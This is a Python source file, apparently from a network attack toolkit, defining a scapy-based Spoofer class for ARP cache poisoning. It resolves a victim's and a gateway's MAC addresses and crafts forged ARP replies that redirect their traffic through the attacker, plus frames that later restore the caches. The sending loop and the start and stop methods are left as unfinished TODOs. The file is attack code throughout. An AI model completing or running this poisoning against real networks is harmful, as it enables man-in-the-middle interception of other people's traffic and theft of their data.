"""arpspoof.py: ARP Spoofing / Poisoning implementation"""

import threading
import time

from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.layers.l2 import ARP, Ether
from scapy.packet import Packet
from scapy.sendrecv import sendp, srp
from .utils import *


class Spoofer:
    def __init__(
        self,
        target_ip: str,
        gateway_ip: str,
        iface: str | None = None,
        interval: float = 2.0,
        restore_count: int = 5,
    ) -> None:
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = iface if iface is not None else conf.iface
        self.interval = interval  # seconds between re-poison bursts
        self.restore_count = (
            restore_count  # number of restoration packets sent when stopping
        )

        # resolve targets
        self.attacker_mac = get_if_hwaddr(self.iface)
        self.victim_mac = resolve_mac(self.target_ip, self.iface)
        self.gateway_mac = resolve_mac(self.gateway_ip, self.iface)

    def poison(self, target_ip: str, target_mac: str, spoofed_ip: str) -> Packet:
        return Ether(src=self.attacker_mac, dst=target_mac) / ARP(
            op=ARP_IS_AT,
            psrc=spoofed_ip,
            hwsrc=self.attacker_mac,
            pdst=target_ip,
            hwdst=target_mac,
        )

    def restore(
        self, target_ip: str, target_mac: str, real_ip: str, real_mac: str
    ) -> Packet:
        return Ether(src=real_mac, dst=target_mac) / ARP(
            op=ARP_IS_AT,
            psrc=real_ip,
            hwsrc=real_mac,
            pdst=target_ip,
            hwdst=target_mac,
        )

    def _run(self) -> None:
        victim_frame = self.poison(self.target_ip, self.victim_mac, self.gateway_ip)
        gateway_frame = self.poison(self.gateway_ip, self.gateway_mac, self.target_ip)

        # TODO: impl

    def start(self) -> None:
        """Begin poisoning both directions in a background thread."""
        # TODO: impl

    def stop(self) -> None:
        """Stop poisoning and restore both caches to their real mappings."""
